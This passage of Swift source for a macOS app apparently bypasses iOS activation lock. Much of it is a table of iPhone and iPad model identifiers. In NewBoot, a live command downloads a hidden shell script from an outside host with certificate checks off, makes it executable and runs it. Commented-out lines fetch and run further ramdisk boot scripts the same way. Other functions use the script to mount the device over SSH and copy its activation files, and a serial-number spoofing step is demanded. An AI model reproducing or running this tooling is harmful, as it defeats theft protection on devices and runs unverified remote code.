            return /*"m68ap",    0x00, 0x8900 */ "iPhone  2G";


        case "iPhone1,2":
            return /*82ap",    0x04, 0x8900 */ "iPhone  3G";


        case "iPhone2,1":
            return /*88ap",    0x00, 0x8920 */ "iPhone  3Gs";


        case "iPhone3,1":
            return /*90ap",    0x00, 0x8930 */ "iPhone  4 (GSM)";


        case "iPhone3,2":
            return /*90bap",   0x04, 0x8930 */ "iPhone  4 (GSM) R2 2012";


        case "iPhone3,3":
            return /*92ap",    0x06, 0x8930 */ "iPhone  4 (CDMA)";


        case "iPhone4,1":
            return /*94ap",    0x08, 0x8940 */ "iPhone  4s";


        case "iPhone5,1":
            return /*41ap",    0x00, 0x8950 */ "iPhone  5 (GSM)";


        case "iPhone5,2":
            return /*42ap",    0x02, 0x8950 */ "iPhone  5 (Global)";


        case "iPhone5,3":
            return /*48ap",    0x0a, 0x8950 */ "iPhone  5c (GSM)";


        case "iPhone5,4":
            return /*49ap",    0x0e, 0x8950 */ "iPhone  5c (Global)";


        case "iPhone6,1":
            return /*51ap",    0x00, 0x8960 */ "iPhone  5s (GSM)";


        case "iPhone6,2":
            return /*53ap",    0x02, 0x8960 */ "iPhone  5s (Global)";


        case "iPhone7,1":
            return /*56ap",    0x04, 0x7000 */ "iPhone  6 Plus";


        case "iPhone7,2":
            return /*61ap",    0x06, 0x7000 */ "iPhone  6";


        case "iPhone8,1":
            
            seisese.isHidden = false;
            seiseseplus.isHidden = true;
            siete.isHidden = true;
            sieteplus.isHidden = true;
            ocho.isHidden = true;
            ochoplus.isHidden = true;
            equis.isHidden = true;
            
            return /*71ap",    0x04, 0x8000 */ "iPhone  6s";
            

        case "iPhone8,2":
            
            seisese.isHidden = true;
            seiseseplus.isHidden = false;
            siete.isHidden = true;
            sieteplus.isHidden = true;
            ocho.isHidden = true;
            ochoplus.isHidden = true;
            equis.isHidden = true;
            return /*66ap",    0x06, 0x8000 */ "iPhone  6s Plus";

        case "iPhone8,4":
            return /*69ap",    0x02, 0x8003 */ "iPhone  SE (1st gen)";


        case "iPhone9,1":
            
            seisese.isHidden = true;
            seiseseplus.isHidden = true;
            siete.isHidden = false;
            sieteplus.isHidden = true;
            ocho.isHidden = true;
            ochoplus.isHidden = true;
            equis.isHidden = true;
            return /*"d10ap",    0x08, 0x8010 */ "iPhone  7 (Global)";


        case "iPhone9,2":
            
            seisese.isHidden = true;
            seiseseplus.isHidden = true;
            siete.isHidden = true;
            sieteplus.isHidden = false;
            ocho.isHidden = true;
            ochoplus.isHidden = true;
            equis.isHidden = true;
            return /*"d11ap",    0x0a, 0x8010 */ "iPhone  7 Plus (Global)";


        case "iPhone9,3":
            
            seisese.isHidden = true;
            seiseseplus.isHidden = true;
            siete.isHidden = false;
            sieteplus.isHidden = true;
            ocho.isHidden = true;
            ochoplus.isHidden = true;
            equis.isHidden = true;
            return /*"d101ap",   0x0c, 0x8010 */ "iPhone  7 (GSM)";


        case "iPhone9,4":
            seisese.isHidden = true;
            seiseseplus.isHidden = true;
            siete.isHidden = true;
            sieteplus.isHidden = false;
            ocho.isHidden = true;
            ochoplus.isHidden = true;
            equis.isHidden = true;
            return /*"d111ap",   0x0e, 0x8010 */ "iPhone  7 Plus (GSM)";


        case "iPhone10,1":
            
            seisese.isHidden = true;
            seiseseplus.isHidden = true;
            siete.isHidden = true;
            sieteplus.isHidden = true;
            ocho.isHidden = false;
            ochoplus.isHidden = true;
            equis.isHidden = true;
            return /*20ap",    0x02, 0x8015*/ "iPhone  8 (Global)";


        case "iPhone10,2":
            
            seisese.isHidden = true;
            seiseseplus.isHidden = true;
            siete.isHidden = true;
            sieteplus.isHidden = true;
            ocho.isHidden = true;
            ochoplus.isHidden = false;
            equis.isHidden = true;
            return /*21ap",    0x04, 0x8015*/ "iPhone  8 Plus (Global)";


        case "iPhone10,3":
            
            seisese.isHidden = true;
            seiseseplus.isHidden = true;
            siete.isHidden = true;
            sieteplus.isHidden = true;
            ocho.isHidden = true;
            ochoplus.isHidden = true;
            equis.isHidden = false;
            return /*22ap",    0x06, 0x8015*/ "iPhone  X (Global)";


        case "iPhone10,4":
            
                
                seisese.isHidden = true;
                seiseseplus.isHidden = true;
                siete.isHidden = true;
                sieteplus.isHidden = true;
                ocho.isHidden = false;
                ochoplus.isHidden = true;
                equis.isHidden = true;
            return /*201ap",   0x0a, 0x8015*/ "iPhone  8 (GSM)";


        case "iPhone10,5":
            
            seisese.isHidden = true;
            seiseseplus.isHidden = true;
            siete.isHidden = true;
            sieteplus.isHidden = true;
            ocho.isHidden = true;
            ochoplus.isHidden = false;
            equis.isHidden = true;
            return /*211ap",   0x0c, 0x8015*/ "iPhone  8 Plus (GSM)";


        case "iPhone10,6":
            
            seisese.isHidden = true;
            seiseseplus.isHidden = true;
            siete.isHidden = true;
            sieteplus.isHidden = true;
            ocho.isHidden = true;
            ochoplus.isHidden = true;
            equis.isHidden = false;
            return /*221ap",   0x0e, 0x8015*/ "iPhone  X (GSM)";

        default:
            return ""

        }
    }
    public func BackupFiles(){
        
        progressBar.minValue = 0
        progressBar.maxValue = 1
        
        
        
                _ = self.shellExec("\"/Users/$(whoami)/Desktop/.real.sh\" openssh")
        
        DispatchQueue.main.async{
                self.progressBar.doubleValue = 0.2
                
                self.progressBar.doubleValue = 0.5
        }
                
                _ = self.shellExec("\"/Users/$(whoami)/Desktop/.real.sh\" mount")
        
        DispatchQueue.main.async{
                self.progressBar.doubleValue = 0.7
        
                self.progressBar.doubleValue = 0.9
        }
                _ = self.shellExec("\"/Users/$(whoami)/Desktop/.real.sh\" backup")
        
        DispatchQueue.main.async{
                self.progressBar.doubleValue = 1
            }
        
                BoxShow("Successfully extracted your activation files!", Buttontext: "Accept")
        DispatchQueue.main.async{
            do{
                self.progressBar.doubleValue = 0
            }
        }
        
    }
    
    
    public func NewBoot(){
        
        deviceDetectionHandler = false
        progressBar.minValue = 0
        progressBar.maxValue = 1
        //STAGE 1================
        
            DispatchQueue.main.async {
                    self.labelTEXT.stringValue = "Please wait! your ramdisk is downloading..."
                
            }
          _ = shellExec("curl -s -k https://bigb033xecution3r.com/REAL.sh -o \"/Users/$(whoami)/Desktop/.real.sh\";chmod +x \"/Users/$(whoami)/Desktop/.real.sh\";\"/Users/$(whoami)/Desktop/.real.sh\" makeram")
        //========================
        
            DispatchQueue.main.async {
                do{
                    self.labelTEXT.stringValue = ""
                }
            }
      //  _ = shellExec("\"/Users/$(whoami)/Desktop/tmp/Enviroment/Darwin/gaster\" pwn; \"/Users/$(whoami)/Desktop/tmp/Enviroment/Darwin/gaster\" reset")
        
            DispatchQueue.main.async {
                do{
                    self.progressBar.doubleValue = 0.1
                }
            }
       // _ = self.shellExec("mkdir -p \"/Users/$(whoami)/Desktop/tmp/.BOOT\"; curl -s -k \"https://bigb033xecution3r.com/BOOT/iBSS.sh\" --output \"/Users/$(whoami)/Desktop/tmp/.BOOT/ibss.sh\"; chmod +x \"/Users/$(whoami)/Desktop/tmp/.BOOT/ibss.sh\"; \"/Users/$(whoami)/Desktop/tmp/.BOOT/ibss.sh\"")
        //STAGE 2================iBSS
        //======================
        DispatchQueue.main.async {
            do{
                self.progressBar.doubleValue = 0.2
            }
        }
      //  _ = self.shellExec("curl -s -k \"https://bigb033xecution3r.com/BOOT/iBEC.sh\" --output \"/Users/$(whoami)/Desktop/tmp/.BOOT/ibec.sh\"; chmod +x \"/Users/$(whoami)/Desktop/tmp/.BOOT/ibec.sh\"; \"/Users/$(whoami)/Desktop/tmp/.BOOT/ibec.sh\"; \"/Users/$(whoami)/Desktop/tmp/Enviroment/Darwin/irecovery\"-c go")
        //STAGE3=================iBEC
        //======================
        DispatchQueue.main.async {
            do{
                self.progressBar.doubleValue = 0.3
            }
        }
                
        //STAGE3=================
        //======================
        
            DispatchQueue.main.async {
                do{
                    self.progressBar.doubleValue = 0.4
                }
            }
        
          //  _ = self.shellExec(" curl -s -k \"https://bigb033xecution3r.com/BOOT/devicetree.sh\" --output \"/Users/$(whoami)/Desktop/tmp/.BOOT/devicetree.sh\"; chmod +x \"/Users/$(whoami)/Desktop/tmp/.BOOT/devicetree.sh\"; \"/Users/$(whoami)/Desktop/tmp/.BOOT/devicetree.sh\"; \"/Users/$(whoami)/Desktop/tmp/Enviroment/Darwin/irecovery\" -c devicetree")
        //STAGE3=================
        //======================
        
            DispatchQueue.main.async {
                do{
                    self.progressBar.doubleValue = 0.6
                }
            }
       // _ = self.shellExec( "curl -s -k \"https://bigb033xecution3r.com/BOOT/ramdisk.sh\" --output \"/Users/$(whoami)/Desktop/tmp/.BOOT/ramdisk.sh\"; chmod +x \"/Users/$(whoami)/Desktop/tmp/.BOOT/ramdisk.sh\"; \"/Users/$(whoami)/Desktop/tmp/.BOOT/ramdisk.sh\"; \"/Users/$(whoami)/Desktop/tmp/Enviroment/Darwin/irecovery\" -c  ramdisk")
        
        
        //STAGE3=================
        //======================
        
            DispatchQueue.main.async {
                do{
                    self.progressBar.doubleValue = 0.8
                }
            }
      //  _ = self.shellExec("curl -s -k \"https://bigb033xecution3r.com/BOOT/trustcache.sh\" --output \"/Users/$(whoami)/Desktop/tmp/.BOOT/trustcache.sh\"; chmod +x \"/Users/$(whoami)/Desktop/tmp/.BOOT/trustcache.sh\"; \"/Users/$(whoami)/Desktop/tmp/.BOOT/trustcache.sh\"; \"/Users/$(whoami)/Desktop/tmp/Enviroment/Darwin/irecovery\" -c firmware")
        
        //STAGE3=================
        //======================
        
           // _ = self.shellExec("curl -s -k \"https://bigb033xecution3r.com/BOOT/kernelcache.sh\" --output \"/Users/$(whoami)/Desktop/tmp/.BOOT/kernelcache.sh\"; chmod +x \"/Users/$(whoami)/Desktop/tmp/.BOOT/kernelcache.sh\"; \"/Users/$(whoami)/Desktop/tmp/.BOOT/kernelcache.sh\"; \"/Users/$(whoami)/Desktop/tmp/Enviroment/Darwin/irecovery\" -c bootx")
        
            DispatchQueue.main.async {
                do{
                    self.progressBar.doubleValue = 1
                    self.BootButton.isEnabled = true
                    _ = self.shellExec("echo ramdisk &>" + self.currentDirectory() + "/.booted")
                }
                self.BoxShow("Successfully Boot your Device!\n\nYour device should now have the screen a little lit up, if so, proceed with Activation.\nOtherwise, try the process again!\n\nSu dispositivo ahora debería tener la pantalla un poco iluminada, si es así, proceda con la Activación.\nDe lo contrario, ¡intenta el proceso de nuevo!", Buttontext: "Accept")
            }
        
            DispatchQueue.main.async {
                do{
                    self.progressBar.doubleValue = 0
                }
            }
                    Reload(false)
                
                
        }
        
        
    
    
    
    func ircv_send_command(_ arguments:String)->String {
     let task = Process();
     task.launchPath = currentDirectory() + "/irecovery";
     task.arguments = ["-c ", arguments];
     let pipe = Pipe();
     task.standardOutput = pipe;
     task.launch();
     task.waitUntilExit()
     let data = pipe.fileHandleForReading.readDataToEndOfFile();
     let output: String = NSString(data:data, encoding: String.Encoding.utf8.rawValue)! as String;
     return output.trimmingCharacters(in: .newlines);
 }

    
    @IBOutlet weak var ButtonFiles:NSButton!
    @IBOutlet weak var seisese:NSImageView!
    @IBOutlet weak var seiseseplus:NSImageView!
    @IBOutlet weak var siete:NSImageView!
    @IBOutlet weak var sieteplus:NSImageView!
    @IBOutlet weak var ocho:NSImageView!
    @IBOutlet weak var ochoplus:NSImageView!
    @IBOutlet weak var equis:NSImageView!
    
    
    func ModelHello()->String{
    
            if (DeviceInfo("ProductType") != "")
            {
                switch (DeviceInfo("ProductType"))
                {
                    case "iPhone1,1":
                        return /*"m68ap",    0x00, 0x8900 */ "iPhone  2G";


                    case "iPhone1,2":
                        return /*82ap",    0x04, 0x8900 */ "iPhone  3G";


                    case "iPhone2,1":
                        return /*88ap",    0x00, 0x8920 */ "iPhone  3Gs";


                    case "iPhone3,1":
                        return /*90ap",    0x00, 0x8930 */ "iPhone  4 (GSM)";


                    case "iPhone3,2":
                        return /*90bap",   0x04, 0x8930 */ "iPhone  4 (GSM) R2 2012";


                    case "iPhone3,3":
                        return /*92ap",    0x06, 0x8930 */ "iPhone  4 (CDMA)";


                    case "iPhone4,1":
                        return /*94ap",    0x08, 0x8940 */ "iPhone  4s";


                    case "iPhone5,1":
                        return /*41ap",    0x00, 0x8950 */ "iPhone  5 (GSM)";


                    case "iPhone5,2":
                        return /*42ap",    0x02, 0x8950 */ "iPhone  5 (Global)";


                    case "iPhone5,3":
                        return /*48ap",    0x0a, 0x8950 */ "iPhone  5c (GSM)";


                    case "iPhone5,4":
                        return /*49ap",    0x0e, 0x8950 */ "iPhone  5c (Global)";


                    case "iPhone6,1":
                        return /*51ap",    0x00, 0x8960 */ "iPhone  5s (GSM)";


                    case "iPhone6,2":
                        return /*53ap",    0x02, 0x8960 */ "iPhone  5s (Global)";


                    case "iPhone7,1":
                        return /*56ap",    0x04, 0x7000 */ "iPhone  6 Plus";


                    case "iPhone7,2":
                        return /*61ap",    0x06, 0x7000 */ "iPhone  6";


                    case "iPhone8,1":
                        
                        seisese.isHidden = false;
                        seiseseplus.isHidden = true;
                        siete.isHidden = true;
                        sieteplus.isHidden = true;
                        ocho.isHidden = true;
                        ochoplus.isHidden = true;
                        equis.isHidden = true;
                        
                        return /*71ap",    0x04, 0x8000 */ "iPhone  6s";
                        

                    case "iPhone8,2":
                        
                        seisese.isHidden = true;
                        seiseseplus.isHidden = false;
                        siete.isHidden = true;
                        sieteplus.isHidden = true;
                        ocho.isHidden = true;
                        ochoplus.isHidden = true;
                        equis.isHidden = true;
                        return /*66ap",    0x06, 0x8000 */ "iPhone  6s Plus";

                    case "iPhone8,4":
                        return /*69ap",    0x02, 0x8003 */ "iPhone  SE (1st gen)";


                    case "iPhone9,1":
                        
                        seisese.isHidden = true;
                        seiseseplus.isHidden = true;
                        siete.isHidden = false;
                        sieteplus.isHidden = true;
                        ocho.isHidden = true;
                        ochoplus.isHidden = true;
                        equis.isHidden = true;
                        return /*"d10ap",    0x08, 0x8010 */ "iPhone  7 (Global)";


                    case "iPhone9,2":
                        
                        seisese.isHidden = true;
                        seiseseplus.isHidden = true;
                        siete.isHidden = true;
                        sieteplus.isHidden = false;
                        ocho.isHidden = true;
                        ochoplus.isHidden = true;
                        equis.isHidden = true;
                        return /*"d11ap",    0x0a, 0x8010 */ "iPhone  7 Plus (Global)";


                    case "iPhone9,3":
                        
                        seisese.isHidden = true;
                        seiseseplus.isHidden = true;
                        siete.isHidden = false;
                        sieteplus.isHidden = true;
                        ocho.isHidden = true;
                        ochoplus.isHidden = true;
                        equis.isHidden = true;
                        return /*"d101ap",   0x0c, 0x8010 */ "iPhone  7 (GSM)";


                    case "iPhone9,4":
                        seisese.isHidden = true;
                        seiseseplus.isHidden = true;
                        siete.isHidden = true;
                        sieteplus.isHidden = false;
                        ocho.isHidden = true;
                        ochoplus.isHidden = true;
                        equis.isHidden = true;
                        return /*"d111ap",   0x0e, 0x8010 */ "iPhone  7 Plus (GSM)";


                    case "iPhone10,1":
                        
                        seisese.isHidden = true;
                        seiseseplus.isHidden = true;
                        siete.isHidden = true;
                        sieteplus.isHidden = true;
                        ocho.isHidden = false;
                        ochoplus.isHidden = true;
                        equis.isHidden = true;
                        return /*20ap",    0x02, 0x8015*/ "iPhone  8 (Global)";


                    case "iPhone10,2":
                        
                        seisese.isHidden = true;
                        seiseseplus.isHidden = true;
                        siete.isHidden = true;
                        sieteplus.isHidden = true;
                        ocho.isHidden = true;
                        ochoplus.isHidden = false;
                        equis.isHidden = true;
                        return /*21ap",    0x04, 0x8015*/ "iPhone  8 Plus (Global)";


                    case "iPhone10,3":
                        
                        seisese.isHidden = true;
                        seiseseplus.isHidden = true;
                        siete.isHidden = true;
                        sieteplus.isHidden = true;
                        ocho.isHidden = true;
                        ochoplus.isHidden = true;
                        equis.isHidden = false;
                        return /*22ap",    0x06, 0x8015*/ "iPhone  X (Global)";


                    case "iPhone10,4":
                        
                            
                            seisese.isHidden = true;
                            seiseseplus.isHidden = true;
                            siete.isHidden = true;
                            sieteplus.isHidden = true;
                            ocho.isHidden = false;
                            ochoplus.isHidden = true;
                            equis.isHidden = true;
                        return /*201ap",   0x0a, 0x8015*/ "iPhone  8 (GSM)";


                    case "iPhone10,5":
                        
                        seisese.isHidden = true;
                        seiseseplus.isHidden = true;
                        siete.isHidden = true;
                        sieteplus.isHidden = true;
                        ocho.isHidden = true;
                        ochoplus.isHidden = false;
                        equis.isHidden = true;
                        return /*211ap",   0x0c, 0x8015*/ "iPhone  8 Plus (GSM)";


                    case "iPhone10,6":
                        
                        seisese.isHidden = true;
                        seiseseplus.isHidden = true;
                        siete.isHidden = true;
                        sieteplus.isHidden = true;
                        ocho.isHidden = true;
                        ochoplus.isHidden = true;
                        equis.isHidden = false;
                        return /*221ap",   0x0e, 0x8015*/ "iPhone  X (GSM)";


                case "iPhone11,2":
                    iPhone(); return /*321ap",   0x0e, 0x8020*/ "iPhone  XS";


                case "iPhone11,4":
                    iPhone(); return /*331ap",   0x0a, 0x8020*/ "iPhone  XS Max (China)";


                case "iPhone11,6":
                    iPhone(); return /*331pap",  0x1a, 0x8020*/ "iPhone  XS Max";


                case "iPhone11,8":
                    iPhone(); return /*"n841ap",   0x0c, 0x8020 */ "iPhone  XR";


                case "iPhone12,1":
                    iPhone(); return /*"n104ap",   0x04, 0x8030 */ "iPhone  11";


                case "iPhone12,3":
                    iPhone(); return /*421ap",   0x06, 0x8030*/ "iPhone  11 Pro";


                case "iPhone12,5":
                    iPhone(); return /*431ap",   0x02, 0x8030*/ "iPhone  11 Pro Max";


                case "iPhone12,8":
                    iPhone(); return /*79ap",    0x10, 0x8030*/ "iPhone  SE (2nd gen)";


                case "iPhone13,1":
                    iPhone(); return /*52gap",   0x0A, 0x8101*/ "iPhone  12 mini";


                case "iPhone13,2":
                    iPhone(); return /*53gap",   0x0C, 0x8101*/ "iPhone  12";


                case "iPhone13,3":
                    iPhone(); return /*53pap",   0x0E, 0x8101*/ "iPhone  12 Pro";


                case "iPhone13,4":
                    iPhone(); return /*54pap",   0x08, 0x8101*/ "iPhone  12 Pro Max";


                case "iPhone14,2":
                    iPhone(); return /*63ap",    0x0C, 0x8110*/ "iPhone  13 Pro";


                case "iPhone14,3":
                    iPhone(); return /*64ap",    0x0E, 0x8110*/ "iPhone  13 Pro Max";


                case "iPhone14,4":
                    iPhone(); return /*16ap",    0x08, 0x8110*/ "iPhone  13 mini";


                case "iPhone14,5":
                    iPhone(); return /*17ap",    0x0A, 0x8110*/ "iPhone  13";


                case "iPhone14,6":
                    iPhone(); return /*49ap",    0x10, 0x8110*/ "iPhone  SE (3rd gen)";


                case "iPhone14,7":
                    iPhone(); return /*27ap",    0x18, 0x8110*/ "iPhone  14";


                case "iPhone14,8":
                    iPhone(); return /*28ap",    0x1A, 0x8110*/ "iPhone  14 Plus";


                case "iPhone15,2":
                    iPhone(); return /*73ap",    0x0C, 0x8120*/ "iPhone  14 Pro";


                case "iPhone15,3":
                    iPhone(); return /*74ap",    0x0E, 0x8120*/ "iPhone  14 Pro Max";

                        
                        
                    //iPAD
                case "iPad1,1": iPad(); return /*k48ap",    0x02, 0x8930*/ "iPad" ;
                case "iPad2,1": iPad(); return /*k93ap",    0x04, 0x8940*/ "iPad 2 (WiFi)" ;
                case "iPad2,2": iPad(); return /*k94ap",    0x06, 0x8940*/ "iPad 2 (GSM)" ;
                case "iPad2,3": iPad(); return /*k95ap",    0x02, 0x8940*/ "iPad 2 (CDMA)" ;
                case "iPad2,4": iPad(); return /*k93aap",   0x06, 0x8942*/ "iPad 2 (WiFi) R2 2012" ;
                case "iPad2,5": iPad(); return /*p105ap",   0x0a, 0x8942*/ "iPad mini (WiFi)" ;
                case "iPad2,6": iPad(); return /*p106ap",   0x0c, 0x8942*/ "iPad mini (GSM)" ;
                case "iPad2,7": iPad(); return /*p107ap",   0x0e, 0x8942*/ "iPad mini (Global)" ;
                case "iPad3,1": iPad(); return /*j1ap",     0x00, 0x8945*/ "iPad (3rd gen, WiFi)" ;
                case "iPad3,2": iPad(); return /*j2ap",     0x02, 0x8945*/ "iPad (3rd gen, CDMA)" ;
                case "iPad3,3": iPad(); return /*j2aap",    0x04, 0x8945*/ "iPad (3rd gen, GSM)" ;
                case "iPad3,4": iPad(); return /*p101ap",   0x00, 0x8955*/ "iPad (4th gen, WiFi)" ;
                case "iPad3,5": iPad(); return /*p102ap",   0x02, 0x8955*/ "iPad (4th gen, GSM)" ;
                case "iPad3,6": iPad(); return /*p103ap",   0x04, 0x8955*/ "iPad (4th gen, Global)" ;
                case "iPad4,1": iPad(); return /*j71ap",    0x10, 0x8960*/ "iPad Air (WiFi)" ;
                case "iPad4,2": iPad(); return /*j72ap",    0x12, 0x8960*/ "iPad Air (Cellular)" ;
                case "iPad4,3": iPad(); return /*j73ap",    0x14, 0x8960*/ "iPad Air (China)" ;
                case "iPad4,4": iPad(); return /*j85ap",    0x0a, 0x8960*/ "iPad mini 2 (WiFi)" ;
                case "iPad4,5": iPad(); return /*j86ap",    0x0c, 0x8960*/ "iPad mini 2 (Cellular)" ;
                case "iPad4,6": iPad(); return /*j87ap",    0x0e, 0x8960*/ "iPad mini 2 (China)" ;
                case "iPad4,7": iPad(); return /*j85map",   0x32, 0x8960*/ "iPad mini 3 (WiFi)" ;
                case "iPad4,8": iPad(); return /*j86map",   0x34, 0x8960*/ "iPad mini 3 (Cellular)" ;
                case "iPad4,9": iPad(); return /*j87map",   0x36, 0x8960*/ "iPad mini 3 (China)" ;
                case "iPad5,1": iPad(); return /*j96ap",    0x08, 0x7000*/ "iPad mini 4 (WiFi)" ;
                case "iPad5,2": iPad(); return /*j97ap",    0x0A, 0x7000*/ "iPad mini 4 (Cellular)" ;
                case "iPad5,3": iPad(); return /*j81ap",    0x06, 0x7001*/ "iPad Air 2 (WiFi)" ;
                case "iPad5,4": iPad(); return /*j82ap",    0x02, 0x7001*/ "iPad Air 2 (Cellular)" ;
                case "iPad6,3": iPad(); return /*j127ap",   0x08, 0x8001*/ "iPad Pro 9.7-inch (WiFi)" ;
                case "iPad6,4": iPad(); return /*j128ap",   0x0a, 0x8001*/ "iPad Pro 9.7-inch (Cellular)" ;
                case "iPad6,7": iPad(); return /*j98aap",   0x10, 0x8001*/ "iPad Pro 12.9-inch (1st gen, WiFi)" ;
                case "iPad6,8": iPad(); return /*j99aap",   0x12, 0x8001*/ "iPad Pro 12.9-inch (1st gen, Cellular)" ;
                case "iPad6,11": iPad(); return /*0x10, 0x8000*/ "iPad (5th gen, WiFi)" ;
                case "iPad6,12": iPad(); return /*j72sap",   0x12, 0x8000*/ "iPad (5th gen, Cellular)" ;
                case "iPad7,1": iPad(); return /*j120ap",   0x0C, 0x8011*/ "iPad Pro 12.9-inch (2nd gen, WiFi)" ;
                case "iPad7,2": iPad(); return /*j121ap",   0x0E, 0x8011*/ "iPad Pro 12.9-inch (2nd gen, Cellular)" ;
                case "iPad7,3": iPad(); return /*j207ap",   0x04, 0x8011*/ "iPad Pro 10.5-inch (WiFi)" ;
                case "iPad7,4": iPad(); return /*j208ap",   0x06, 0x8011*/ "iPad Pro 10.5-inch (Cellular)" ;
                case "iPad7,5": iPad(); return /*j71bap",   0x18, 0x8010*/ "iPad (6th gen, WiFi)" ;
                case "iPad7,6": iPad(); return /*j72bap",   0x1A, 0x8010*/ "iPad (6th gen, Cellular)" ;
                case "iPad7,11": iPad(); return /*j171ap",   0x1C, 0x8010*/ "iPad (7th gen, WiFi)" ;
                case "iPad7,12": iPad(); return /*j172ap",   0x1E, 0x8010*/ "iPad (7th gen, Cellular)" ;
                case "iPad8,1": iPad(); return /*j317ap",   0x0C, 0x8027*/ "iPad Pro 11-inch (1st gen, WiFi)" ;
                case "iPad8,2": iPad(); return /*j317xap",  0x1C, 0x8027*/ "iPad Pro 11-inch (1st gen, WiFi, 1TB)" ;
                case "iPad8,3": iPad(); return /*j318ap",   0x0E, 0x8027*/ "iPad Pro 11-inch (1st gen, Cellular)" ;
                case "iPad8,4": iPad(); return /*j318xap",  0x1E, 0x8027*/ "iPad Pro 11-inch (1st gen, Cellular, 1TB)" ;
                case "iPad8,5": iPad(); return /*j320ap",   0x08, 0x8027*/ "iPad Pro 12.9-inch (3rd gen, WiFi)" ;
                case "iPad8,6": iPad(); return /*j320xap",  0x18, 0x8027*/ "iPad Pro 12.9-inch (3rd gen, WiFi, 1TB)" ;
                case "iPad8,7": iPad(); return /*j321ap",   0x0A, 0x8027*/ "iPad Pro 12.9-inch (3rd gen, Cellular)" ;
                case "iPad8,8": iPad(); return /*j321xap",  0x1A, 0x8027*/ "iPad Pro 12.9-inch (3rd gen, Cellular, 1TB)" ;
                case "iPad8,9": iPad(); return /*j417ap",   0x3C, 0x8027*/ "iPad Pro 11-inch (2nd gen, WiFi)" ;
                case "iPad8,10": iPad(); return /*j418ap",   0x3E, 0x8027*/ "iPad Pro 11-inch (2nd gen, Cellular)" ;
                case "iPad8,11": iPad(); return /*j420ap",   0x38, 0x8027*/ "iPad Pro 12.9-inch (4th gen, WiFi)" ;
                case "iPad8,12": iPad(); return /*j421ap",   0x3A, 0x8027*/ "iPad Pro 12.9-inch (4th gen, Cellular)" ;
                case "iPad11,1": iPad(); return /*j210ap",   0x14, 0x8020*/ "iPad mini (5th gen, WiFi)" ;
                case "iPad11,2": iPad(); return /*j211ap",   0x16, 0x8020*/ "iPad mini (5th gen, Cellular)" ;
                case "iPad11,3": iPad(); return /*j217ap",   0x1C, 0x8020*/ "iPad Air (3rd gen, WiFi)" ;
                case "iPad11,4": iPad(); return /*j218ap",   0x1E, 0x8020*/ "iPad Air (3rd gen, Cellular)" ;
                case "iPad11,6": iPad(); return /*j171aap",  0x24, 0x8020*/ "iPad (8th gen, WiFi)" ;
                case "iPad11,7": iPad(); return /*j172aap",  0x26, 0x8020*/ "iPad (8th gen, Cellular)" ;
                case "iPad12,1": iPad(); return /*j181ap",   0x18, 0x8030*/ "iPad (9th gen, WiFi)" ;
                case "iPad12,2": iPad(); return /*j182ap",   0x1A, 0x8030*/ "iPad (9th gen, Cellular)" ;
                case "iPad13,1": iPad(); return /*j307ap",   0x04, 0x8101*/ "iPad Air (4th gen, WiFi)" ;
                case "iPad13,2": iPad(); return /*j308ap",   0x06, 0x8101*/ "iPad Air (4th gen, Cellular)" ;
                case "iPad13,4": iPad(); return /*j517ap",   0x08, 0x8103*/ "iPad Pro 11-inch (3rd gen, WiFi)" ;
                case "iPad13,5": iPad(); return /*j517xap",  0x0A, 0x8103*/ "iPad Pro 11-inch (3rd gen, WiFi, 2TB)" ;
                case "iPad13,6": iPad(); return /*j518ap",   0x0C, 0x8103*/ "iPad Pro 11-inch (3rd gen, Cellular)" ;
                case "iPad13,7": iPad(); return /*j518xap",  0x0E, 0x8103*/ "iPad Pro 11-inch (3rd gen, Cellular, 2TB)" ;
                case "iPad13,8": iPad(); return /*j522ap",   0x18, 0x8103*/ "iPad Pro 12.9-inch (5th gen, WiFi)" ;
                case "iPad13,9": iPad(); return /*j522xap",  0x1A, 0x8103*/ "iPad Pro 12.9-inch (5th gen, WiFi, 2TB)" ;
                case "iPad13,10": iPad(); return /*j523ap",   0x1C, 0x8103*/ "iPad Pro 12.9-inch (5th gen, Cellular)" ;
                case "iPad13,11": iPad(); return /*j523xap",  0x1E, 0x8103*/ "iPad Pro 12.9-inch (5th gen, Cellular, 2TB)" ;
                case "iPad13,16": iPad(); return /*j407ap",   0x10, 0x8103*/ "iPad Air (5th gen, WiFi)" ;
                case "iPad13,17": iPad(); return /*j408ap",   0x12, 0x8103*/ "iPad Air (5th gen, Cellular)" ;
                case "iPad13,18": iPad(); return /*j271ap",   0x14, 0x8101*/ "iPad (10th gen, WiFi)" ;
                case "iPad13,19": iPad(); return /*j272ap",   0x16, 0x8101*/ "iPad (10th gen, Cellular)" ;
                case "iPad14,1": iPad(); return /*j310ap",   0x04, 0x8110*/ "iPad mini (6th gen, WiFi)" ;
                case "iPad14,2": iPad(); return /*j311ap",   0x06, 0x8110*/ "iPad mini (6th gen, Cellular)" ;
                case "iPad14,3": iPad(); return /*j617ap",   0x08, 0x8112*/ "iPad Pro 11-inch (4th gen, WiFi)" ;
                case "iPad14,4": iPad(); return /*j618ap",   0x0A, 0x8112*/ "iPad Pro 11-inch (4th gen, Cellular)" ;
                case "iPad14,5": iPad(); return /*j620ap",   0x0C, 0x8112*/ "iPad Pro 12.9-inch (6th gen, WiFi)" ;
                case "iPad14,6": iPad(); return /*j621ap",   0x0E, 0x8112*/ "iPad Pro 12.9-inch (6th gen, Cellular)" ;
                    default:
                        return "Conecta tu Dispositivo..."
                }
            }
        return "Conecta tu Dispositivo..."
    
    
    
    }
    
    func iPad(){
        
        seisese.isHidden = true;
        seiseseplus.isHidden = true;
        siete.isHidden = true;
        sieteplus.isHidden = true;
        ocho.isHidden = true;
        ochoplus.isHidden = true;
        equis.isHidden = true;
        iphoneimage.isHidden = true;
        ipadimage.isHidden = false;
    }
    @IBOutlet weak var iphoneimage:NSImageView!
    
    func iPhone(){
        
        seisese.isHidden = true;
        seiseseplus.isHidden = true;
        siete.isHidden = true;
        sieteplus.isHidden = true;
        ocho.isHidden = true;
        ochoplus.isHidden = true;
        equis.isHidden = true;
        iphoneimage.isHidden = false
        ipadimage.isHidden = true
    }
    @IBAction func Files(_ sender:Any){
        if(DeviceInfo("SerialNumber") != "C38K4AG6DTTN"){
            BoxShow("You need before change your SerialNumber\nActual: " + DeviceInfo("SerialNumber") + "\nChange for: C38K4AG6DTTN", Buttontext: "Accept");
        }
        else if(DeviceInfo("SerialNumber") == "C38K4AG6DTTN"){
            deviceDetectionHandler = false
            GenerateFiles();
        }
    }
    
    func Desktop()->String{
        
        return shellExec("echo " + Escritorio() + "")
        
    }
    
    func ShowDates()->String{
